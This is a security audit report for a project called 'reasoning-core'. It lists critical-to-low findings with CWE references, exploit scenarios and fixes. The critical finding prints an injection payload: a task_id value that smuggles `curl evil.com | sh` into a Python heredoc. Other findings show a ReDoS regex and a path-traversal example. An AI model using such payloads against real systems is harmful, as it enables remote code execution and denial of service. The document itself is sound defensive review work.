# Security Review: reasoning-core

## Files Reviewed
1. `src/ssm_backbone.py` -- model loading from Hugging Face
2. `src/hooks/_rule_engine.py` -- regex patterns on user code
3. `eval/run_ablation.py` -- shell command execution
4. `eval/run_task.sh` -- shell script
5. `eval/compare_embedders.py` -- model loading
6. `scripts/enable-in-repo-kimi.sh` -- shell script modifying user directories
7. `scripts/migrate_audit_log_v1_to_v2.py` -- file migration
8. `src/hooks/_dispatch.py` -- gate functions with stderr output
9. `src/hooks/audit_log.py` -- audit log writing
10. `src/s2_core.py` -- HTTP endpoint

---

## Detailed Findings

### CRITICAL

#### C1: Python Code Injection via Unquoted Shell Variables in Heredoc (`run_task.sh`)

```
SEVERITY: CRITICAL
FILE: eval/run_task.sh:300-327
CWE: CWE-94 (Code Injection), CWE-78 (OS Command Injection)
ISSUE: `$TASK_ID` and `$OUT_DIR` are interpolated directly into a Python heredoc
       without any sanitization. The `TASK_ID` variable comes from user-controlled
       dataset JSON (via `$1`), and `OUT_DIR` comes from `$3` or environment.
       A `TASK_ID` containing a double quote breaks out of the Python string
       literal and injects arbitrary Python code.
EXPLOIT_SCENARIO: An attacker crafts a dataset entry with task_id containing
       a crafted payload like: `task_id = 'x"; import os; os.system("curl evil.com | sh"); y="'`
       The resulting Python heredoc becomes:
         "task_id": "x"; import os; os.system("curl evil.com | sh"); y="",
       This is syntactically valid Python that executes arbitrary commands.
FIX: Pass variables as environment variables or command-line arguments to the
     Python script instead of interpolating them into the source code:
       python3 - "$TASK_ID" "$ARM" "$OUT_DIR" "$META_JSON" "$USAGE_JSON" <<'PY'
       import json, os, sys
       task_id, arm, out_dir = sys.argv[1:4]
       meta = json.loads(sys.argv[4])
       usage = json.loads(sys.argv[5])
       ...
       with open(os.path.join(out_dir, f"{task_id}.{arm}.json"), "w") as fh:
       PY
     Note the quoted heredoc delimiter `<<'PY'` to prevent shell expansion.
```

---

### HIGH

#### H1: ReDoS via Unbounded Regex in Rule Engine (`_rule_engine.py`)

```
SEVERITY: HIGH
FILE: src/hooks/_rule_engine.py:646-671
CWE: CWE-1333 (Inefficient Regular Expression), CWE-400 (Uncontrolled Resource Consumption)
ISSUE: `_check_forbid_pattern()` compiles and executes regex patterns from
       rules.yaml without any timeout or complexity analysis. A malicious or
       accidentally crafted pattern like `(a+)+$` matched against a long input
       string causes catastrophic backtracking, pinning the CPU indefinitely.
       The per-rule budget (5ms) is only checked AFTER the regex completes.
EXPLOIT_SCENARIO: An attacker with control over rules.yaml (or who can trick
       an operator into accepting a malicious rules file) includes a pattern
       like `(.*a){x}` for some large x. When the rule engine evaluates an
       edit containing a long line, the process hangs, causing a denial of
       service on the scoring pipeline.
FIX: Use `func_timeout` or `signal.alarm` (Unix) to enforce a hard timeout
     on each regex execution:
       import signal
       def _timeout_handler(signum, frame):
           raise TimeoutError("regex timeout")
       signal.signal(signal.SIGALRM, _timeout_handler)
       signal.setitimer(signal.ITIMER_REAL, 0.1)  # 100ms max
       try:
           m = pat.search(line)
       finally:
           signal.alarm(0)
     Or use the `re2` library which guarantees linear-time matching.
```

#### H2: DoS via Unbounded Input on HTTP Endpoints (`s2_core.py`)

```
SEVERITY: HIGH
FILE: src/s2_core.py:1069-1133, 1139-1213
CWE: CWE-770 (Allocation of Resources Without Limits), CWE-400 (DoS)
ISSUE: The `/score` and `/baseline` endpoints accept arbitrarily large inputs
       with no size limits, rate limiting, or request timeouts. `before_src` and
       `after_src` strings are passed to `parse_source()` (tree-sitter parsing)
       and `embed()` (model inference). While `embed()` caps at `max_length`
       tokens, tree-sitter parsing of a multi-megabyte source file can consume
       excessive memory and CPU. The `/baseline` endpoint processes an
       unbounded number of files.
EXPLOIT_SCENARIO: An attacker sends a POST to /score with `before_src` and
       `after_src` each containing 100MB of source code. Tree-sitter parsing
       pins CPU and memory for an extended period, denying service to other
       scoring requests. Multiple concurrent requests amplify the effect.
FIX: Add FastAPI request size limits and input validation:
     - Limit total request body size to ~1MB via middleware
     - Limit `before_src`/`after_src` to a reasonable max (e.g., 64KB each)
     - Limit `/baseline` `files` list to ~100 files
     - Add request timeout middleware
     Example:
       @app.middleware("http")
       async def limit_body(request: Request, call_next):
           body = await request.body()
           if len(body) > 1_000_000:
               return JSONResponse({"error": "payload_too_large"}, 413)
           return await call_next(request)
```

#### H3: Information Disclosure via HTTP Error Responses (`s2_core.py`)

```
SEVERITY: HIGH
FILE: src/s2_core.py:1118-1130
CWE: CWE-209 (Generation of Error Message Containing Sensitive Information)
ISSUE: The `/score` endpoint returns raw exception details in HTTP responses:
       - `BackboneUnavailableError` at line 1122-1123 exposes `str(exc)` which
         may contain checkpoint names, repo IDs, candidate lists, and env var
         names from `ssm_backbone.py` error messages.
       - Generic exceptions at line 1127-1130 expose `str(exc)` which could
         contain file paths, stack traces, or other internal details.
EXPLOIT_SCENARIO: An attacker probes the /score endpoint with various inputs
       or embedder configurations to trigger different error paths. Each
       response leaks internal model choices (e.g., "mistralai/Mamba-Codestral-7B-v0.1"),
       directory structures, or implementation details, aiding reconnaissance
       for targeted attacks.
FIX: Sanitize error details before returning them to the client:
       except BackboneUnavailableError:
           logger.exception("Backbone unavailable")
           return JSONResponse(
               status_code=503,
               content={"error": "backbone_unavailable", "detail": None},
           )
       except Exception:
           logger.exception("Internal error")
           return JSONResponse(
               status_code=500,
               content={"error": "internal_error", "detail": None},
           )
     Log full details server-side; return generic messages to the client.
```

#### H4: Unvalidated task_id from Dataset Passed to Subprocess (`run_ablation.py`)

```
SEVERITY: HIGH
FILE: eval/run_ablation.py:177, eval/run_task.sh:42-55
CWE: CWE-20 (Improper Input Validation), CWE-78 (OS Command Injection)
ISSUE: `task_id` values from the dataset JSON are passed directly as command-line
       arguments to `run_task.sh` without validation. While `subprocess.run()`
       with a list prevents direct shell injection, `run_task.sh` uses the
       task_id in filesystem paths (`WORKDIR="$SCRATCH_BASE-$TASK_ID-$ARM"`)
       and critically in the Python heredoc (see CRITICAL-1). There is no
       validation that task_id is a safe identifier (e.g., alphanumeric only).
EXPLOIT_SCENARIO: A compromised dataset contains task_ids with path traversal
       sequences or shell metacharacters. These propagate through the ablation
       harness to create/delete directories in unexpected locations and execute
       arbitrary Python code (via the heredoc).
FIX: Validate task_id before passing to subprocess:
       import re
       if not re.match(r'^[A-Za-z0-9_\-]+$', task_id):
           raise ValueError(f"Invalid task_id: {task_id!r}")
     Also apply the heredoc fix from CRITICAL-1.
```

---

### MEDIUM

#### M1: Path Traversal in Rule Engine Glob Matching (`_rule_engine.py`)

```
SEVERITY: MEDIUM
FILE: src/hooks/_rule_engine.py:706-726
CWE: CWE-22 (Path Traversal)
ISSUE: `_path_matches_target_paths()` normalizes `file_path` by replacing
       backslashes and stripping leading slashes, but does NOT resolve `..`
       path traversal sequences. A file_path like `../secret.py` retains its
       `..` components. When matched against broad glob patterns like `**/*.py`,
       the traversal path is matched and rules are applied to files outside
       the intended scope.
EXPLOIT_SCENARIO: An agent crafts an edit to `../../../etc/passwd` with a
       rule targeting `**/*`. The rule engine evaluates the forbidden pattern
       against this file, potentially allowing operations on files outside the
       project directory that should be out of scope.
FIX: Resolve `file_path` with `os.path.normpath()` to collapse `..` sequences
     before glob matching:
       norm = os.path.normpath(file_path.replace("\\", "/")).lstrip("/")
     Additionally, validate that the resolved path stays within the project root.
```

#### M2: Sensitive Path Leakage in Rule Engine stderr (`_rule_engine.py`)

```
SEVERITY: MEDIUM
FILE: src/hooks/_rule_engine.py:118, 122, 352-353
CWE: CWE-209 (Information Exposure Through an Error Message)
ISSUE: In lenient mode, schema validation errors write to stderr including the
       exception message which may contain the full file path to rules.yaml.
       Example: `cannot read rules.yaml: [Errno 2] No such file: '/home/alice/project/.reasoning-core/rules.yaml'`
       This leaks the user's home directory, username, and project structure.
EXPLOIT_SCENARIO: An attacker reads stderr/logs from a CI pipeline or shared
       environment and learns internal directory structures, usernames, and
       project layout from the leaked paths.
FIX: Redact file paths before writing to stderr:
       import os
       redacted_exc = str(exc).replace(str(project_root), "[PROJECT_ROOT]")
       sys.stderr.write(f"[rule-engine] warn: cannot read rules.yaml: {redacted_exc}\n")
```

#### M3: Sensitive Path Leakage in Gate stderr Outputs (`_dispatch.py`)

```
SEVERITY: MEDIUM
FILE: src/hooks/_dispatch.py:184-187, 289-291, 302-303, 632, 635
CWE: CWE-209 (Information Exposure Through an Error Message)
ISSUE: Multiple gate functions include `file_path` and `plan_path` in their
       stderr outputs returned via `GateOutcome.stderr`. These paths are then
       written to stderr by the orchestrator, potentially leaking:
       - `gate_lang_lock`: full file path + declared language
       - `gate_plan_grounding`: full file path + full PLAN.md path + ref count
       - `gate_rule_engine`: full file path + rule ID + line number
EXPLOIT_SCENARIO: In a shared CI environment, stderr output is captured in
       build logs. An attacker reads these logs to discover internal project
       structures, absolute paths containing usernames, and file locations.
FIX: Redact paths in stderr output, or use relative paths. Example:
       stderr=(
           f"[reasoning-core] WARN: edit drifts from plan -- "
           f"{os.path.basename(file_path)} not in PLAN.md "
           f"({len(refs)} files in plan)\n"
       )
```

#### M4: Internal Model Info Leakage in Logs (`ssm_backbone.py`)

```
SEVERITY: MEDIUM
FILE: src/ssm_backbone.py:131-133, 250-254, 406-407, 469-479
CWE: CWE-209 (Information Exposure Through an Error Message)
ISSUE: Error messages and info-level log entries include checkpoint names,
       repository IDs, embedder names, hidden sizes, parameter counts, device
       info, and candidate lists. These leak the exact models being used,
       their versions, and the fallback chain.
       Examples:
       - "Loading embedder=codestral-mamba checkpoint=mistralai/Mamba-Codestral-7B-v0.1"
       - "checkpoint sshleifer/tiny-gpt2 failed to load"
       - "RC_EMBEDDER=mistralai/Mamba-Codestral-7B-v0.1_REVISION=abc123 is not a 40-char hex commit SHA"
EXPLOIT_SCENARIO: An attacker with log read access learns which foundation
       models are in use, their exact versions, and the fallback chain. This
       aids in crafting model-specific adversarial inputs or supply-chain
       attacks targeting the exact model version.
FIX: Log embedder names (internal identifiers) but not full repo IDs at INFO.
     Log full checkpoint details only at DEBUG level. Sanitize error messages
     exposed to external callers.
```

#### M5: Unsafe Directory Writing Without CWD Validation (`enable-in-repo-kimi.sh`)

```
SEVERITY: MEDIUM
FILE: scripts/enable-in-repo-kimi.sh:28-62
CWE: CWE-22 (Path Traversal), CWE-732 (Incorrect Permission Assignment)
ISSUE: The script writes files into the current working directory without
       validating that cwd is a safe location. Running from `/` or `/tmp`
       creates `/.kimi/settings.json` or `/tmp/.kimi/settings.json`.
       Additionally, there is no check for symlink attacks on `.kimi` or
       `.envrc` -- an attacker could pre-create a symlink to redirect writes.
       The script also modifies `.envrc` and `.gitignore` in-place.
EXPLOIT_SCENARIO: A user runs the script from `/tmp` (perhaps after extracting
       an archive), accidentally creating `/tmp/.kimi/settings.json`. In a
       shared /tmp environment, another user could read the generated file.
       Alternatively, an attacker pre-creates a symlink `.kimi -> /etc/` and
       the script writes settings.json to `/etc/settings.json`.
FIX: 1. Validate cwd is not a system directory:
         cwd=$(pwd)
         if [[ "$cwd" == "/" || "$cwd" == "/tmp" || "$cwd" == "$HOME" ]]; then
             echo "error: refusing to run from $cwd; cd to your project first" >&2
             exit 1
         fi
      2. Check for symlinks before writing:
         if [[ -L "$target_dir" ]]; then
             echo "error: $target_dir is a symlink; remove it first" >&2
             exit 1
         fi
      3. Set restrictive permissions: chmod 700 "$target_dir" after creation.
```

---

### LOW

#### L1: Unscrubbed Numerical Fields in Audit Redaction (`audit_log.py`)

```
SEVERITY: LOW
FILE: src/hooks/audit_log.py:166-181
CWE: CWE-212 (Improper Cross-boundary Removal of Sensitive Data)
ISSUE: The `_redact()` function scrubs `file_path`, `human_summary`, `reason`,
       and `command` for secrets, but does not inspect `fired_margins` or
       `consensus_score` fields. While these contain only numerical values
       (floats) which are not secret-bearing, defense-in-depth suggests they
       should be within the redaction scope. The `audit_extra` nested dict
       (from _dispatch.py) is also not recursively scrubbed.
EXPLOIT_SCENARIO: Low direct risk since these fields contain only numbers.
       However, if future code adds string fields to `audit_extra` without
       updating `_redact()`, those strings could leak secrets.
FIX: Extend `_redact()` to recursively process nested dicts and apply
     `_scrub_inline()` to all string values regardless of key:
       def _deep_redact(obj):
           if isinstance(obj, dict):
               return {k: _deep_redact(v) for k, v in obj.items()}
           if isinstance(obj, list):
               return [_deep_redact(v) for v in obj]
           if isinstance(obj, str):
               return _scrub_inline(obj)
           return obj
```

#### L2: Environment Info Leak on Import (`audit_log.py`)

```
SEVERITY: LOW
FILE: src/hooks/audit_log.py:56-60
CWE: CWE-209 (Information Exposure Through an Error Message)
ISSUE: At module import time, if `portalocker` is not installed, a message is
       written to stderr revealing that the optional locking dependency is
       missing. This is a side effect at import time that leaks information
       about the runtime environment.
EXPLOIT_SCENARIO: In shared environments where stderr is captured, an
       attacker learns which optional dependencies are missing, informing
       subsequent attacks (e.g., race conditions on audit log files).
FIX: Defer the warning to first write attempt, or use logger.warning()
     instead of direct stderr write, so the message respects log configuration.
```

#### L3: Symlink Race in Audit Log File Operations (`audit_log.py`)

```
SEVERITY: LOW
FILE: src/hooks/audit_log.py:240-268
CWE: CWE-363 (Race Condition Enabling Link Following)
ISSUE: `append_event()` creates directories and writes files based on
       `_AUDIT_ROOT` without checking for symlink attacks. In a shared
       environment, an attacker could replace the audit directory with a
       symlink to redirect writes elsewhere.
FIX: Use `os.path.realpath()` to resolve the audit root before creating
     directories, or open files with `O_NOFOLLOW` where available.
```

#### L4: Overly Permissive Backup File Creation (`migrate_audit_log_v1_to_v2.py`)

```
SEVERITY: LOW
FILE: scripts/migrate_audit_log_v1_to_v2.py:72-78
CWE: CWE-732 (Incorrect Permission Assignment)
ISSUE: Backup files are created with default filesystem permissions (subject
       to umask), which in typical configurations means world-readable. Audit
       logs may contain sensitive operational data.
FIX: Set restrictive permissions on the backup file after creation:
       import stat
       backup.write_text(...)
       backup.chmod(stat.S_IRUSR | S_IWUSR)  # 0o600
```

---

## Positive Security Controls (Acknowledged)

1. **SHA Pinning with Strict Validation** (`ssm_backbone.py:96-140`): `_resolve_revision()` validates env override against `^[0-9a-f]{40}$`, rejecting mutable refs. Commit SHAs are pinned for all models. Well done.

2. **`trust_remote_code=False` Universally** (`ssm_backbone.py:331-334`): Both `AutoTokenizer.from_pretrained()` and `AutoModel.from_pretrained()` set `trust_remote_code=False` for ALL embedder arms. All model loading goes through `_try_load()`, so no arm bypasses this. Excellent.

3. **`subprocess.run()` with List, No `shell=True`** (`run_ablation.py:182-187`, `compare_embedders.py:171-176`): Subprocess calls use argument lists, preventing direct shell injection. Good.

4. **RC_EMBEDDER Whitelist with `.strip()`** (`ssm_backbone.py:163-169`): Env var is stripped before whitelist check, preventing trivial bypasses via whitespace padding.

5. **Atomic Writes with Backup** (`migrate_audit_log_v1_to_v2.py:72-90`): Migration creates `.bak` backup before atomic temp-file-then-rename. Idempotent design. Good.

6. **Session ID Sanitization** (`audit_log.py:125`): `_session_id()` sanitizes with `re.sub(r"[^A-Za-z0-9_\-]", "_", str(raw))[:64]`, preventing path traversal via session IDs.

7. **`set -euo pipefail`** (`run_task.sh:30`, `enable-in-repo-kimi.sh:12`): Both shell scripts use strict mode, catching unbound variables and pipe failures.

8. **S2_PORT binds loopback only** (`s2_core.py:1223-1225`): Default `host="127.0.0.1"` ensures the HTTP service is not exposed to the network by default.

---

## Summary by Severity

| Severity | Count | Findings |
|----------|-------|----------|
| CRITICAL | 1 | C1: Python code injection in run_task.sh heredoc |
| HIGH | 4 | H1: ReDoS in rule engine; H2: DoS on HTTP endpoints; H3: Info disclosure in HTTP errors; H4: Unvalidated task_id |
| MEDIUM | 5 | M1: Path traversal in glob; M2-M3: Path leakage in stderr; M4: Model info in logs; M5: Unsafe CWD writing |
| LOW | 4 | L1-L4: Audit redaction gaps, import leak, symlink race, backup permissions |

---

## Remediation Priority

1. **Immediate**: Fix C1 (heredoc injection) -- quote heredoc delimiter and pass variables as arguments.
2. **This sprint**: Fix H1 (regex timeout), H2 (input size limits), H3 (sanitize HTTP errors).
3. **Next sprint**: Fix M1-M5 (path handling, stderr redaction, cwd validation).
4. **Backlog**: Address L1-L4 (defense-in-depth improvements).
